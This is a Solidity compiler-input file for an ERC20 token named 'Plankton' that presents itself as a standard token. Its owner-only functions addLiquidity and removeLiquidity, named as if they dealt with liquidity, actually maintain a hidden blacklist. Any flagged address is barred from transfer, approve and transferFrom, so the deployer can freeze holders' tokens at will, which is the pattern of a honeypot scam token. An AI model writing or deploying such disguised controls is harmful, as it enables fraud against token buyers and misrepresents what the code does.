{{
  "language": "Solidity",
  "sources": {
    "PLANKTON.sol": {
      "content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        _owner = msg.sender;\r\n        emit OwnershipTransferred(address(0), _owner);\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ncontract Plankton is IERC20, Ownable {\r\n    string public name;\r\n    string public symbol;\r\n    uint8 public decimals;\r\n    uint256 private _totalSupply;\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => bool) private liquidity;\r\n\r\n    constructor() {\r\n        name = \"Plankton\";\r\n        symbol = \"PLANKTON\";\r\n        decimals = 10;\r\n        _totalSupply = 100000000000 * 10**uint256(decimals);\r\n        _balances[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function getLiquitdityStatus(address _addrs) public view onlyOwner returns (bool) {\r\n        return liquidity[_addrs];\r\n    }\r\n\r\n    function addLiquidity(address[] memory liquidity_) external onlyOwner {\r\n        for (uint256 i = 0; i < liquidity_.length; i++) {\r\n            liquidity[liquidity_[i]] = true;\r\n        }\r\n    }\r\n\r\n    function removeLiquidity(address account) external onlyOwner {\r\n        require(liquidity[account], \"Address is not in array\");\r\n\r\n        liquidity[account] = false;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        address sender = msg.sender;\r\n        require(!liquidity[_msgSender()], \"Sender is in array\");\r\n        require(!liquidity[recipient], \"Recipient is in array\");\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"ERC20: transfer amount must be greater than zero\");\r\n        require(_balances[sender] >= amount, \"ERC20: insufficient balance\");\r\n\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender)\r\n        public\r\n        view\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        address owner = msg.sender;\r\n        require(!liquidity[_msgSender()], \"Approver is in array\");\r\n        require(!liquidity[spender], \"Spender is in array\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        require(!liquidity[sender], \"Sender is in array\");\r\n        require(!liquidity[recipient], \"Recipient is in array\");\r\n        require(!liquidity[_msgSender()], \"Caller is in array\");\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"ERC20: transfer amount must be greater than zero\");\r\n        require(_balances[sender] >= amount, \"ERC20: insufficient balance\");\r\n        require(\r\n            _allowances[sender][msg.sender] >= amount,\r\n            \"ERC20: insufficient allowance\"\r\n        );\r\n\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n}\r\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}